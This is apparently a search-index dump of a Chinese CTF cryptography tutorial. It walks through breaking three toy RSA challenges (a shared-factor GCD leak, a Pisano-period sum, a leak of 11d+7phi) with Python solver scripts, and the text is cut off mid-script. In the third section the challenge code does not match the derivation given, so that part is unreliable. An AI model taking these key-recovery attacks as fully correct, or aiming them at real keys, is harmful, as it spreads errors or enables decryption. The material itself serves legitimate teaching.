<p>\u90a3 GCD(n, t) \u4f1a\u6b63\u597d\u662f p \u5417\uff1f\u4f1a\u4e0d\u4f1a\u5305\u542b\u5176\u4ed6\u56e0\u5b50\uff1f $$ \\begin{aligned} &amp;GCD(pqr,p(q + r)) = p * GCD(qr,q + r) \\end{aligned} $$ \u7531\u4e8e q \u548c r \u90fd\u662f\u751f\u6210\u7684 512 \u4f4d\u968f\u673a\u5927\u7d20\u6570\uff0c\u5b83\u4eec\u4e92\u8d28\uff0c\u4e14\u5b83\u4eec\u7684\u548c q+r \u6781\u5927\u6982\u7387\u4e0e\u5b83\u4eec\u7684\u79ef qr \u4e92\u8d28</p> <p>\u56e0\u6b64 GCD(qr, q+r) = 1</p> <p>\u7ed3\u8bba\uff1a \u76f4\u63a5\u8ba1\u7b97 GCD(n, t) \u5c31\u80fd\u65e0\u75db\u63d0\u53d6\u51fa\u7d20\u6570 p</p> <p>\u5bf9\u4e8e n=pqr\uff0c\u6b27\u62c9\u51fd\u6570\u5b9a\u4e49\u4e3a\uff1a $$ \\begin{aligned} &amp;\\phi(n) = (p-1)(q-1)(r-1)\\ &amp;\\phi(n) = (p-1)  [(q-1)(r-1)]\\\\ &amp;n - t = pqr - pq -  pr\\ &amp;n - t = p(qr - q -  r)\\ &amp;(n - t) // p = (qr - q -  r)\\ &amp;(n - t) // p + 1 = (qr - q -  r) + 1\\\\ &amp;qr - q -  r + 1 = q(r - 1) - 1(r - 1)\\ &amp;q(r - 1) - 1(r - 1) = (q - 1)(r - 1)\\\\ &amp;(n - t) // p + 1 = (q - 1)(r - 1)\\ &amp;\\phi(n) = (p-1)  [(q-1)(r-1)]\\\\ \\end{aligned} $$ \u89c2\u5bdf\u516c\u56e0\u6570 \u662f Crypto \u9009\u624b\u7684\u76f4\u89c9\u3002\u770b\u5230 n \u548c t \u6709\u660e\u663e\u7684\u516c\u5171\u7ed3\u6784\uff08\u90fd\u542b\u6709 p\uff09\uff0c\u7b2c\u4e00\u65f6\u95f4\u60f3\u5230\u7684\u5c31\u662f GCD</p> <pre><code>from Crypto.Util.number import *\n\n# ==========================================\n# \u9898\u76ee\u4fe1\u606f\u4e0e\u6570\u5b66\u5173\u7cfb\u56de\u987e\n# ------------------------------------------\n# \u5df2\u77e5\uff1a\n# n = p * q * r  (\u4e09\u7d20\u6570 RSA)\n# s = p + q + r  (\u6b64\u53d8\u91cf\u5728\u672c\u811a\u672c\u4e2d\u672a\u88ab\u4f7f\u7528)\n# t = p * q + p * r = p * (q + r)\n# ==========================================\n\n# \u9898\u76ee\u7ed9\u51fa\u7684\u957f\u6574\u6570\u6570\u636e\uff08\u7701\u7565\u90e8\u5206\u4ee5\u4fdd\u6301\u6574\u6d01\uff09\nc = 216719040256186298397028655750064798850... \nn = 894056034566447301955142597300391580123...\nt = 157435908314881832180551915807491465031...\n\n# [\u7b2c\u4e00\u6b65]\uff1a\u63d0\u53d6\u516c\u5171\u7d20\u56e0\u5b50 p\n# \u6570\u5b66\u539f\u7406\uff1an = p*q*r\uff0ct = p*(q+r)\n# \u663e\u7136 p \u662f n \u548c t \u7684\u6700\u5927\u516c\u7ea6\u6570\np = GCD(n, t)\n\n# [\u7b2c\u4e8c\u6b65]\uff1a\u5de7\u5999\u6784\u9020\u6b27\u62c9\u51fd\u6570 phi(n)\n# \u76ee\u6807\uff1aphi = (p-1) * (q-1) * (r-1)\n# \n# 1. \u62ec\u53f7\u53f3\u8fb9\u63a8\u5bfc\uff1a((n - t) // p + 1)\n#    \u5206\u5b50\uff1an - t = pqr - (pq + pr) = pqr - pq - pr = p(qr - q - r)\n#    \u9664\u6cd5\uff1a(n - t) // p = qr - q - r\n#    \u52a0\u4e00\uff1aqr - q - r + 1\n#    \u56e0\u5f0f\u5206\u89e3\uff1aq(r-1) - 1(r-1) = (q-1)(r-1)\n#\n# 2. \u6700\u7ec8\u5408\u5e76\uff1a\n#    (p-1) * [(q-1)(r-1)] = phi(n)\nphi = (p - 1) * ((n - t) // p + 1)\n\n# [\u7b2c\u4e09\u6b65]\uff1a\u5e38\u89c4 RSA \u79c1\u94a5\u8ba1\u7b97\n# \u8ba1\u7b97 e \u5728\u6a21 phi \u4e0b\u7684\u4e58\u6cd5\u9006\u5143 d\nd = inverse(65537, phi)\n\n# [\u7b2c\u56db\u6b65]\uff1a\u89e3\u5bc6\n# m = c^d mod n\nm = pow(c, d, n)\n\n# \u5c06\u89e3\u5bc6\u51fa\u7684\u957f\u6574\u6570\u8f6c\u6362\u4e3a\u5b57\u8282\u4e32\uff08\u5373\u660e\u6587 Flag\uff09\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"Crypto/Chapter6/6-24/","title":"\u5229\u7528\u6590\u6ce2\u90a3\u5951\u6570\u5217\u5468\u671f\u91cd\u590d\u6027\u7206\u7834","text":""},{"location":"Crypto/Chapter6/6-24/#\u5229\u7528\u6590\u6ce2\u90a3\u5951\u6570\u5217\u5468\u671f\u91cd\u590d\u6027\u7206\u7834","title":"\u5229\u7528\u6590\u6ce2\u90a3\u5951\u6570\u5217\u5468\u671f\u91cd\u590d\u6027\u7206\u7834","text":"<p>\u9898\u76ee\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from Crypto.Util.number import *\nfrom gmpy2 import next_prime\nfrom functools import reduce\nfrom secret import flag\n\n\ndef F(x):\n    if x == 1 or x == 2:\n        return 1\n    return F(x-1)+F(x-2)\n\n\nn = reduce(lambda a, b: a*b, [getPrime(4) for _ in range(4)])\nr = getRandomNBitInteger(67)\nS = sum([F(i) % n for i in range(r)])\np = next_prime(S**16)\nq = getPrime(p.bit_length())\nm = bytes_to_long(flag)\nc = pow(m, 65537, p*q)\n\nprint(\"r =\", r)\nprint(\"n =\", n)\nprint(\"c =\", c)\nprint(\"N =\", p*q)\n</code></pre> <p>\u73b0\u5728\u5206\u6790\u4ee3\u7801</p> <p>\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6590\u6ce2\u90a3\u5951\u6570\u5217</p> <pre><code>def F(x):\n    if x == 1 or x == 2:\n        return 1\n    # \u9012\u5f52\u5b9a\u4e49\uff0c\u8ba1\u7b97\u91cf\u5de8\u5927\uff0c\u4f46\u7531\u4e8e\u6a21\u8fd0\u7b97\uff0c\u5b9e\u9645\u8ba1\u7b97\u53ea\u9700\u5728\u4e00\u4e2a\u5468\u671f\u5185\u5b8c\u6210\n    return F(x-1) + F(x-2)\n</code></pre> <p>\u6590\u6ce2\u90a3\u5951\u6570\u5217\u662f\u4e00\u4e2a**\u9012\u63a8\u6570\u5217**\uff0c\u5b83\u7684\u6838\u5fc3\u89c4\u5219\u662f\uff1a\u4ece\u7b2c\u4e09\u9879\u8d77\uff0c\u6570\u5217\u4e2d\u7684\u6bcf\u4e00\u9879\u90fd\u7b49\u4e8e\u524d\u4e24\u9879\u4e4b\u548c $$ \\begin{aligned} &amp;F_n = F_{n-1} + F_{n-2} (n \\geq 3) \\end{aligned} $$ \u5728 CTF \u548c\u6570\u8bba\u9886\u57df\uff0c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684**\u6a21\u8fd0\u7b97\u6027\u8d28**\u81f3\u5173\u91cd\u8981\uff1a</p> <p>Pisano \u5468\u671f</p> <ul> <li>\u5b9a\u4e49\uff1a \u6590\u6ce2\u90a3\u5951\u6570\u5217\u5bf9\u4efb\u4f55\u6b63\u6574\u6570 n \u53d6\u6a21\u540e\uff0c\u90fd\u4f1a\u53d8\u6210\u4e00\u4e2a**\u5faa\u73af\u6570\u5217**\u3002\u8fd9\u4e2a\u5faa\u73af\u7684\u957f\u5ea6\u5c31\u88ab\u79f0\u4e3a Pisano \u5468\u671f\uff0c\u8bb0\u4f5c   $$   \\begin{aligned}   &amp;\\pi(n)   \\end{aligned}   $$</li> </ul> <p>\u5c0f\u6a21\u6570 n \u7684\u751f\u6210</p> <pre><code># 2. \u5c0f\u6a21\u6570 n \u7684\u751f\u6210\n# \u751f\u6210 4 \u4e2a 4-bit \u7684\u5c0f\u7d20\u6570\uff08p_i &lt;= 15\uff09\n# n \u662f\u8fd9\u56db\u4e2a\u5c0f\u7d20\u6570\u7684\u4e58\u79ef\n# n \u7684\u5927\u5c0f\u7ea6\u4e3a 16 bits (n &lt;= 15^4 = 50625)\nn = reduce(lambda a, b: a*b, [getPrime(4) for _ in range(4)])\n</code></pre> <p>\u5de8\u5927\u7684\u6c42\u548c\u4e0a\u9650 r</p> <pre><code># 3. \u5de8\u5927\u7684\u6c42\u548c\u4e0a\u9650 r\n# r \u662f\u4e00\u4e2a 67-bit \u7684\u5927\u6574\u6570 (r \u7ea6\u7b49\u4e8e 2^67)\n# \u6ce8\u610f\uff1ar \u662f\u8ba1\u7b97 S \u7684\u552f\u4e00\u8f93\u5165\uff0c\u4e14 r \u5df2\u7ecf\u6cc4\u9732\u7ed9\u6211\u4eec\nr = getRandomNBitInteger(67)\n</code></pre> <p>S \u7684\u8ba1\u7b97</p> <pre><code># 4. \u5173\u952e\u6cc4\u9732\u4fe1\u606f S \u7684\u8ba1\u7b97 (S\u662f p \u7684\u57fa\u7840)\n# S \u662f\u524d r \u4e2a\u6590\u6ce2\u90a3\u5951\u6570\u5728\u6a21 n \u4e0b\u7684\u548c\uff1aS = Sum_{i=0}^{r-1} (F(i) mod n)\nS = sum([F(i) % n for i in range(r)])\n</code></pre> <p>\u751f\u6210\u5de8\u5927\u7684\u7d20\u6570 p</p> <pre><code># 5. \u751f\u6210\u5de8\u5927\u7684\u7d20\u6570 p\n# p \u662f S^16 \u4e4b\u540e\u7684\u7b2c\u4e00\u4e2a\u7d20\u6570\n# S \u7684\u5927\u5c0f\u7ea6\u4e3a r * n (\u7ea6 2^67 * 2^16 = 2^83)\n# p \u7684\u5927\u5c0f\u7ea6\u4e3a (2^83)^16 = 2^1328 bits\np = next_prime(S**16)\n</code></pre> <p>\u751f\u6210\u7d20\u6570 q</p> <pre><code># 6. \u751f\u6210\u7d20\u6570 q\n# q \u662f\u4e00\u4e2a\u4e0e p \u76f8\u540c\u957f\u5ea6\u7684\u7d20\u6570 (q \u7ea6 1328 bits)\nq = getPrime(p.bit_length())\n</code></pre> <p>\u9996\u5148\u8981\u6c42\u51fa p -&gt; S -&gt; r \u8fd9\u4e2a\u987a\u5e8f</p> <p>\u5148\u770b S \u7684\u8ba1\u7b97\u65b9\u5f0f $$ \\begin{aligned} &amp;S = \\sum_{i-0}^{r-1}{F((i)  (mod n))} \\end{aligned} $$ \u6c42\u548c\u6b21\u6570 r \u592a\u5927\uff0c\u4f46\u662f\uff0c\u6c42\u548c\u65f6\u4f7f\u7528\u7684\u6a21\u6570 n \u5374\u975e\u5e38\u5c0f\uff08\u4e0d\u5230 65536\uff09</p> <p>\u8fd9\u662f\u6574\u4e2a\u89e3\u9898\u7684\u5173\u952e\u6b65\u9aa4\u3002\u6211\u4eec\u4e0d\u80fd\u5faa\u73af r \u6b21\uff0c\u4f46 n \u5f88\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u627e\u89c4\u5f8b</p> <p>Pisano \u5468\u671f\uff08\u91cd\u590d\u7684\u821e\u8e48\uff09</p> <p>\u5f53\u6590\u6ce2\u90a3\u5951\u6570\u5217\u5bf9\u4e00\u4e2a\u5c0f\u6570\u5b57 n \u53d6\u6a21\u65f6\uff0c\u5b83\u7684\u7ed3\u679c\u4f1a\u4e0d\u65ad\u91cd\u590d\uff0c\u5f62\u6210\u4e00\u4e2a**\u5faa\u73af**\u3002\u8fd9\u4e2a\u5faa\u73af\u7684\u957f\u5ea6\u5c31\u662f Pisano \u5468\u671f T</p> <ul> <li>\u6590\u6ce2\u90a3\u5951\u6570\u5217 mod n \u5c31\u50cf\u4e00\u4e2a**\u821e\u8005**\u5728\u4e00\u4e2a\u5f88\u5c0f\u7684\u5706\u5f62\u821e\u53f0\uff08\u6a21\u6570 n\uff09\u4e0a\u8df3\u821e\u3002\u5b83\u8df3\u4e86\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u59ff\u52bf\u548c\u4f4d\u7f6e\u4e00\u5b9a\u4f1a\u56de\u5230\u8d77\u70b9 (1, 1)</li> <li>\u5468\u671f T \u5c31\u662f\u8fd9\u652f\u821e\u5b8c\u6574\u8df3\u5b8c\u4e00\u6b21\u6240\u9700\u8981\u7684\u6b65\u6570</li> </ul> <p>\u901a\u8fc7\u811a\u672c\u5b9e\u73b0</p> <pre><code>a, b = 1, 1\nwhile True:\n    a, b = b, (a + b) % n # \u627e\u5230\u4e0b\u4e00\u6b65\u7684\u821e\u6b65\n    if a == 1 and b == 1: # \u68c0\u67e5\u662f\u5426\u56de\u5230\u8d77\u70b9\n        T = period = len(fibs) # \u8bb0\u5f55\u6b65\u6570 T\n        break\n</code></pre> <p>\u56e0\u4e3a n \u5f88\u5c0f\uff0c\u8fd9\u4e2a\u5faa\u73af\u5f88\u5feb\u5c31\u80fd\u7ed3\u675f\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u5468\u671f T \u548c\u8df3\u4e00\u5708\u821e\u7684\u603b\u5f97\u5206 Sum_{cycle}</p> <p>\u73b0\u5728\u6211\u4eec\u6709\u4e86\u821e\u8e48\u7684\u89c4\u5f8b\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97 r \u6b65\u7684\u603b\u5f97\u5206 S\uff1a</p> <ul> <li>\u5b8c\u6574\u5468\u671f\u6570 k\uff1a k = r // T \uff08\u770b\u770b r \u6b65\u80fd\u8df3\u591a\u5c11\u6b21\u5b8c\u6574\u7684\u821e\uff09</li> <li>\u5269\u4f59\u6b65\u6570 rem\uff1a rem = r \\% T \uff08\u6700\u540e\u591a\u51fa\u6765\u6ca1\u8df3\u5b8c\u7684\u51e0\u6b65\uff09</li> </ul> \\[ \\begin{aligned} &amp;S\\ =\\ (\u5b8c\u6574\u6b21\u6570\\ k\\ *\\ \u4e00\u5708\u7684\u603b\u5f97\u5206\\ Sum_{cycle})\\ +\\ (\u5269\u4f59\u51e0\u6b65\u7684\u5f97\u5206\\ Sum_{cycle}) \\end{aligned} \\] <p>\u8fd9\u4e00\u6b65\u5c31\u5c06\u5929\u6587\u6570\u5b57 r \u8f6c\u6362\u6210\u4e86\u4e00\u4e2a\u53ef\u8ba1\u7b97\u7684\u516c\u5f0f\uff0c\u5f97\u5230\u4e86\u6211\u4eec\u60f3\u8981\u7684\u79d8\u5bc6\u84dd\u56fe S</p> \u811a\u672c\u4ee3\u7801 \u4f5c\u7528 \u7b80\u5355\u7406\u89e3 <code>p = next_prime(S ** 16)</code> \u8ba1\u7b97\u7b2c\u4e00\u4e2a\u79d8\u5bc6\u96f6\u4ef6 p\u3002 \u4e25\u683c\u6309\u7167\u9898\u76ee\u7684\u516c\u5f0f\uff0c\u627e\u5230 S^{16} \u4e4b\u540e\u7684\u7b2c\u4e00\u4e2a\u7d20\u6570 <code>q = N // p</code> \u8ba1\u7b97\u7b2c\u4e8c\u4e2a\u79d8\u5bc6\u96f6\u4ef6 q\u3002 N \u662f p \u548c q \u7684\u4e58\u79ef\uff0c\u6240\u4ee5 q = N / p <code>phi = (p - 1) * (q - 1)</code> \u8ba1\u7b97\u5236\u9020\u84dd\u56fe \\phi(N) <code>d = inverse(65537, phi)</code> \u8ba1\u7b97\u4e07\u80fd\u94a5\u5319 d\u3002 <code>inverse</code> \u662f\u6c42\u4e00\u4e2a\u6570\u5728 \\pmod{phi} \u4e16\u754c\u91cc\u7684\u201c\u5012\u6570\u201d <code>m = pow(c, d, N)</code> \u89e3\u5bc6\uff01 \u4f7f\u7528\u4e07\u80fd\u94a5\u5319 d \u6253\u5f00\u4fdd\u9669\u7bb1 N \u4e2d\u7684\u5bc6\u6587 c <code>long_to_bytes(m)</code> \u5c06\u89e3\u5bc6\u5f97\u5230\u7684\u6570\u5b57 m \u8f6c\u6362\u56de Flag \u6587\u672c <p>\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from Crypto.Util.number import *\nimport gmpy2\n\n# ==========================================\n# 1. \u5728\u6b64\u586b\u5165\u9898\u76ee\u7ed9\u51fa\u7684\u53c2\u6570 (\u4ece\u4f60\u7684\u9898\u76ee\u8f93\u51fa\u4e2d\u590d\u5236)\n# ==========================================\nr = 6799657976717333  # \u9898\u76ee\u7ed9\u51fa\u7684 r (67-bit integer)\nn = 34969  # \u9898\u76ee\u7ed9\u51fa\u7684 n (\u5c0f\u6574\u6570\uff0c\u7ea6 16-bit)\nc = 182306974283951620352146026941583994848813143690343545292100780435573376889099600153592983212384957591086328477660614034391593564733860826251499298995355977799109267846836211477797049861348446512705981010295182077777939692478140339301301250656211795668782349225298841295102744088295274299888068087536135862146848855194234931032258224223054120694400807261402442809227521150204434199401928373883267697928229945582110688115412960868921538084717338343966490113059627708880297277412143561561837953806960309840302665509500602335832680764801782789278492075478763944213005349707521471401389317139473794212210077629296628421658105048387207038261321205  # \u9898\u76ee\u7ed9\u51fa\u7684\u5bc6\u6587 c\nN = 1885611999537620305525377668936000019248252379006235038175895811710218489750248037027959751027236326639084060685909621893589756343903429224938045802850975926055076789137326688384533999739909152386986919824268841500802585809839133132715892685629871188263336038221503698167753853207939360629026179572549702198037779413041272313618794196167670066872427987596564652249864272782397242041014605617282098654595635031878004275878165728021995744626212185694275937448739806439006047047376363093018124169182873374456718929377731991273039952515054850718253257895996999907977029169396644305213162133388169761391593110121229266422245167572929912914529689341  # \u9898\u76ee\u7ed9\u51fa\u7684\u516c\u94a5 N\n\n\n# ==========================================\n# 2. \u6838\u5fc3\u51fd\u6570\uff1a\u5bfb\u627e Pisano \u5468\u671f\u5e76\u8ba1\u7b97\u5468\u671f\u548c\n#    \u5bf9\u5e94\u601d\u8def 2 \u7684\u4f18\u5316\u7248\uff1a\u76f4\u63a5\u5728 Python \u4e2d\u5b9e\u73b0\n# ==========================================\ndef get_pisano_info(n):\n    # \u6590\u6ce2\u90a3\u5951\u6570\u5217\u7f13\u5b58\uff0c\u7528\u4e8e\u8ba1\u7b97\u4f59\u6570\u90e8\u5206\u7684\u548c\n    fibs = [1, 1]\n\n    # \u5bfb\u627e\u5468\u671f\uff1a\u66b4\u529b\u8fed\u4ee3\u76f4\u5230\u518d\u6b21\u51fa\u73b0 \"1, 1\"\n    # \u56e0\u4e3a n \u5f88\u5c0f\uff0c\u8fd9\u4e2a\u5faa\u73af\u4f1a\u5f88\u5feb\u7ed3\u675f\n    a, b = 1, 1\n    period = 0\n\n    while True:\n        # \u4e0b\u4e00\u9879 F(i) = F(i-1) + F(i-2)\n        a, b = b, (a + b) % n\n        fibs.append(b)\n\n        # \u68c0\u67e5\u662f\u5426\u56de\u5230\u4e86\u8d77\u70b9 (1, 1)\n        # \u6ce8\u610f\uff1a\u73b0\u5728\u7684 b \u662f\u65b0\u7684\u4e00\u9879\uff0ca \u662f\u4e0a\u4e00\u9879\n        if a == 1 and b == 1:\n            # \u627e\u5230\u4e86\u5faa\u73af\u8282\uff01\n            # \u6b64\u65f6 fibs \u6700\u540e\u4e24\u4e2a\u662f 1, 1\uff0c\u5c5e\u4e8e\u4e0b\u4e00\u4e2a\u5468\u671f\u7684\u5f00\u59cb\uff0c\u8981\u53bb\u6389\n            fibs.pop()\n            fibs.pop()\n            period = len(fibs)\n            break\n\n    period_sum = sum(fibs)\n    return period, period_sum, fibs\n\n\nprint(f\"[*] Analyzing Pisano period for n = {n}...\")\nperiod, period_sum, fibs = get_pisano_info(n)\nprint(f\"[+] Period found: T = {period}\")\nprint(f\"[+] Sum of one period: {period_sum}\")\n\n# ==========================================\n# 3. \u8ba1\u7b97 S\n#    \u5229\u7528\u516c\u5f0f\uff1aS = (\u5b8c\u6574\u5468\u671f\u7684\u6b21\u6570 * \u5468\u671f\u548c) + (\u5269\u4f59\u90e8\u5206\u7684\u548c)\n# ==========================================\nk = r // period  # \u5b8c\u6574\u7684\u5468\u671f\u6570\nrem = r % period  # \u5269\u4f59\u7684\u9879\u6570\n\n# \u5269\u4f59\u90e8\u5206\u7684\u548c = \u524d rem \u9879\u4e4b\u548c\nrem_sum = sum(fibs[:rem])\n\n# \u8ba1\u7b97\u6700\u7ec8\u7684 S (\u6ce8\u610f\u9898\u76ee\u4e2d S \u662f\u6a21 n \u540e\u6c42\u548c\uff0c\u4e0d\u9700\u8981\u518d\u5bf9 S \u53d6\u6a21)\nS = k * period_sum + rem_sum\nprint(f\"[+] Calculated S = {S}\")\n\n# ==========================================\n# 4. \u6062\u590d RSA \u5bc6\u94a5 p, q\n#    \u9898\u76ee\u903b\u8f91\uff1ap = next_prime(S**16)\n# ==========================================\n# \u6ce8\u610f S**16 \u5f88\u5927\uff0c\u9700\u8981\u7528 gmpy2 \u5904\u7406\u5927\u6570\u8fd0\u7b97\nbase_p = gmpy2.mpz(S) ** 16\np = int(gmpy2.next_prime(base_p))\n\n# \u9a8c\u8bc1 p \u662f\u5426\u6b63\u786e\nif N % p == 0:\n    print(\"[+] Successfully recovered p!\")\n    q = N // p\nelse:\n    print(\"[-] Failed to recover p. Check parameters.\")\n    exit()\n\n# ==========================================\n# 5. \u6807\u51c6 RSA \u89e3\u5bc6\n# ==========================================\ne = 65537\nphi = (p - 1) * (q - 1)\nd = inverse(e, phi)\n\nm = pow(c, d, N)\nflag = long_to_bytes(m)\n\nprint(\"\\n--------------------------------------------------\")\nprint(\"Flag:\", flag.decode())\nprint(\"--------------------------------------------------\")\n</code></pre>"},{"location":"Crypto/Chapter6/6-25/","title":"\u5229\u7528 p \u4fe1\u606f\u6cc4\u9732 GCD \u653b\u51fb","text":""},{"location":"Crypto/Chapter6/6-25/#\u5229\u7528-p-\u4fe1\u606f\u6cc4\u9732-gcd-\u653b\u51fb","title":"\u5229\u7528 p \u4fe1\u606f\u6cc4\u9732 GCD \u653b\u51fb","text":"<p>\u89e3\u9898\u6280\u5de7\u5148\u653e\u524d\u9762\uff1a</p> <ol> <li>**\u8bc6\u522b GCD \u653b\u51fb\u6a21\u5f0f\uff1a**\u770b\u5230\u6cc4\u9732\u4fe1\u606f hint = m^17 (mod p)\uff0c\u5fc5\u987b\u7acb\u523b\u8054\u60f3\u5230 p \u662f (m^17 - hint) \u7684\u56e0\u5b50</li> </ol> <pre><code>from Crypto.Util.number import *\nfrom secret import flag # \u76ee\u6807\u660e\u6587\n\n# 1. \u521d\u59cb\u5316\u548c\u5bc6\u94a5\u751f\u6210\nm = bytes_to_long(flag)  # \u5c06 Flag \u8f6c\u6362\u4e3a\u5de8\u5927\u7684\u6574\u6570 m\np = getPrime(1024)       # \u751f\u6210\u7b2c\u4e00\u4e2a\u79d8\u5bc6\u7d20\u6570 p (1024 bits)\nq = getPrime(1024)       # \u751f\u6210\u7b2c\u4e8c\u4e2a\u79d8\u5bc6\u7d20\u6570 q (1024 bits)\nn = p * q                # RSA \u6a21\u6570 N (2048 bits\uff0c\u5b89\u5168\u6807\u51c6)\n\n# 2. \u6838\u5fc3\u6f0f\u6d1e\uff1aHint \u7684\u6cc4\u9732\n# \u63d0\u793a H \u662f\u660e\u6587 m \u4ee5\u6781\u5c0f\u7684\u6307\u6570 17 \u5bf9\u7d20\u6570 p \u53d6\u6a21\u7684\u7ed3\u679c\u3002\n# \u6570\u5b66\u5173\u7cfb\uff1ahint \u2261 m^17 (mod p)\n# \u8fd9\u610f\u5473\u7740 p \u6574\u9664 (m^17 - hint)\nhint = pow(m, 17, p)\n\n# 3. \u6807\u51c6 RSA \u52a0\u5bc6\ne = 65537                # \u516c\u94a5\u6307\u6570 e (\u6700\u5e38\u7528\u7684 Fermat \u7d20\u6570)\nc = pow(m, e, n)         # \u5bc6\u6587 c \u2261 m^e (mod n)\n\n# 4. \u6cc4\u9732\u7ed9\u653b\u51fb\u8005\u7684\u4fe1\u606f\nprint(\"n =\", n)          # \u516c\u94a5\u6a21\u6570 N (2048-bit)\nprint(\"e =\", e)          # \u516c\u94a5\u6307\u6570\nprint(\"c =\", c)          # \u5bc6\u6587\nprint(\"hint =\", hint)    # \u6cc4\u9732\u4fe1\u606f H (m^17 mod p)\n</code></pre> <p>\u6211\u4eec\u4ece\u9898\u76ee\u63d0\u4f9b\u7684\u4e24\u4e2a\u57fa\u672c\u5173\u7cfb\u5f00\u59cb\uff1a $$ \\begin{aligned} &amp;1: x = 11  d + 7  \\phi(n)\\\\ &amp;2: e  d \\equiv 1 (mod  {\\phi(n)})\\\\ &amp;\u5c06 RSA \u5173\u7cfb\u8f6c\u5316\u4e3a\u4ee3\u6570\u7b49\u5f0f\uff0c\u5f15\u5165\u4e00\u4e2a\u672a\u77e5\u6574\u6570 r\\\\ &amp;e  d = 1 + r  \\phi(n) \\end{aligned} $$ \u6211\u4eec\u7684\u76ee\u6807\u662f\u6d88\u9664\u672a\u77e5\u6570 d\u3002\u6700\u6709\u6548\u7684\u65b9\u6cd5\u662f\u5c06**\u7b49\u5f0f 1* \u7684\u4e24\u4fa7\u90fd\u4e58\u4ee5\u5df2\u77e5\u7684\u516c\u94a5 e\uff0c\u4ece\u800c\u5f15\u5165 e * d \u9879\uff0c\u65b9\u4fbf\u8fdb\u884c\u66ff\u6362</p> <p>\u5c06**\u7b49\u5f0f 1** \u4e24\u4fa7\u540c\u4e58 e\uff1a $$ \\begin{aligned} &amp;3: x  e= 11  (e  d)+ 7  e \\phi(n) \\end{aligned} $$ \u73b0\u5728\uff0c\u6211\u4eec\u5c06**\u7b49\u5f0f 2** \u4ee3\u5165**\u7b49\u5f0f 3** \u4e2d\u7684 (e * d) \u9879\uff1a $$ \\begin{aligned} &amp;3: x  e= 11  (1 + r  \\phi(n))+ 7  e \\phi(n) \\end{aligned} $$ \u73b0\u5728\uff0c\u7b49\u5f0f\u4e2d\u5df2\u7ecf\u6210\u529f\u6d88\u9664\u4e86 d\u3002\u6211\u4eec\u8fdb\u884c\u4ee3\u6570\u6574\u7406\uff0c\u5c06\u6240\u6709\u542b\u6b27\u62c9\u51fd\u6570 n \u7684\u9879\u5f52\u7c7b\uff0c\u5e38\u6570\u9879\u79fb\u5230\u5de6\u4fa7 $$ \\begin{aligned} &amp;x  e= 11 + 11  r  \\phi(n)+ 7  e \\phi(n)\\\\ &amp;x  e - 11 = 11  r  \\phi(n)+ 7  e \\phi(n)\\\\ &amp;x  e - 11 = (11  r + 7  e) \\phi(n)\\\\ &amp;\\phi(n) = \\frac{x*e-11}{11*r+7*e}\\\\ \\end{aligned} $$ \u8fd9\u4e2a\u65b9\u7a0b\u4e2d\uff0c\u552f\u4e00\u5269\u4e0b\u7684\u672a\u77e5\u6570\u662f\u6574\u6570 r</p> <p>\u7531\u4e8e\u6b27\u62c9\u51fd\u6570 n \u5fc5\u987b\u662f\u4e00\u4e2a\u5de8\u5927\u7684**\u6574\u6570**\uff08\u901a\u5e38 2048 \u4f4d\uff09\uff0c\u56e0\u6b64\u5206\u5b50\u5fc5\u987b\u80fd\u591f\u88ab\u5206\u6bcd**\u6574\u9664**</p> <p>\u6240\u4ee5\u76f4\u63a5\u7206\u7834\u7834\u89e3 r</p> <pre><code>from Crypto.Util.number import *\nimport gmpy2\nimport sys\n\n# =========================================================\n# \u6b65\u9aa4 1: \u66ff\u6362\u4e3a\u9898\u76ee\u4e2d\u6cc4\u9732\u7684\u53c2\u6570\n# IMPORTANT: \u8bf7\u5c06\u8fd9\u91cc\u7684\u5360\u4f4d\u7b26\u66ff\u6362\u4e3a\u4f60\u5b9e\u9645\u7684 CTF \u6570\u636e\uff01\n# =========================================================\nN = 15321211041844905603734344178124947500324300419514650914959277216026081094496518094622195813971694335738777589926626969243883848477814650916143749322154944235584863085124154540941941026813506509060939499627059712020664731558566028207969260861863294704292014958955493668692256998253634012942569080200336487172402729072437050952572508561453302097971258470685521456512378089846772560530301852104802168974905937732653119166440832834381675710869396094149006807933529429939569477709674581421481769103309376717894952118650888932952440197471338958967318775671821835706884032860123711415773758546392549257375305940969423099611  # RSA \u6a21\u6570 n\nE = 65537  # \u516c\u94a5\u6307\u6570 e (\u901a\u5e38\u662f 65537)\nC = 14896093236493033914781929755936872928003725648997746598164823180134348743474984136539422027221313199599273430548738399424773586673404519182726589878322104929749149555906399158136445184378100079558203687049497943904275695897824656260657349522646553949766831267321006314984113971129230701131171378457086851261467999754137290017989201512492586108768533159551545321805463224339252886492732021354821330371600069958523522302729848548167244423902572054475396534469987383265867036041513161170273368613864180696427386890714264902686976581317435011139081192227958859641684254938165261747405568369502852705979424383731908971282  # \u5bc6\u6587 c\nX = 265060901898485540806769085700708185460124724747068797929982044073895401490880169847709049380530156090772787935089173201664711759633269693627724735457902114209008145932150728406880988293457762401679305297063608204632708505031098047582175011825482347052645324085149631658741807382378778694666759557421043250548432429798543553950625554307402164142007388940921309688918410535907564996075660231557340541491155676279511654970843992008027830570227549010293790074386638365293013298327534604995316180405779571245069623638693068707267840181413082202552862853411080755107836252852929279422343700808788459217261282790226013328915  # \u6cc4\u9732\u4fe1\u606f x (x = 11*d + 7*phi(n))\n\n\n# \u6211\u4eec\u53ef\u4ee5\u4ece r=1 \u5f00\u59cb\uff0c\u56e0\u4e3a r \u5fc5\u987b\u662f\u6b63\u6574\u6570\nR_MAX = 100000\n\n\n# =========================================================\n# \u6b65\u9aa4 2: \u6838\u5fc3\u89e3\u9898\u51fd\u6570 - \u679a\u4e3e r \u6c42\u89e3 phi(n)\n# =========================================================\n\ndef solve_modified_rsa(N, E, C, X, R_MAX):\n    \"\"\"\n    \u6839\u636e\u516c\u5f0f phi(n) = (X*E - 11) / (11*r + 7*E) \u679a\u4e3e r\uff0c\n    \u5e76\u9a8c\u8bc1\u7ed3\u679c\u662f\u5426\u4e3a\u5408\u6cd5\u7684 phi(n)\u3002\n    \"\"\"\n\n    # \u516c\u5f0f\u5206\u5b50 C_NUM = X*E - 11\n    C_NUM = 